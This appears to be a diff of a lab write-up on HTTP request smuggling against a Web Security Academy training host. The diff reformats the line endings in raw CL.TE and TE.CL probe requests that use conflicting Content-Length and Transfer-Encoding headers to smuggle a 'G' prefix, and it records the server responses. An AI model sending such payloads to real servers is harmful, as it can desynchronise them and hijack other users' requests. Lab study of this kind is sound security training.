@@ -82,9 +82,9 @@ Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 6
 Transfer-Encoding: chunked
-\r\n
-3\r\n
-abc\r\n
+
+3
+abc
 X
 ```
 We get 500 Internal Server Error and the msg: "Server Error: Communication timed out"
@@ -101,9 +101,9 @@ Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 6
 Transfer-Encoding: chunked
-\r\n
-0\r\n
-\r\n
+
+0
+
 G
 ```
 The second response responded: "Unrecognized method GPOST"
@@ -128,9 +128,9 @@ POST / HTTP/1.1
 Host: ff.web-security-academy.net
 Content-Length: 6
 Transfer-Encoding: chunked
-\r\n
-3\r\n
-abc\r\n
+
+3
+abc
 X\r\n
 ```
 As the response we get: 400 Bad Request, {"error":"Invalid request"}
@@ -159,10 +159,10 @@ POST / HTTP/1.1
 Host: ff.web-security-academy.net
 Content-Length: 3
 Transfer-Encoding: chunked
-\r\n
-1\r\n
-G\r\n
-0\r\n
+
+1
+G
+0
 \r\n
 ```
 First response is 200 and the second response: "Unrecognized method G0POST"
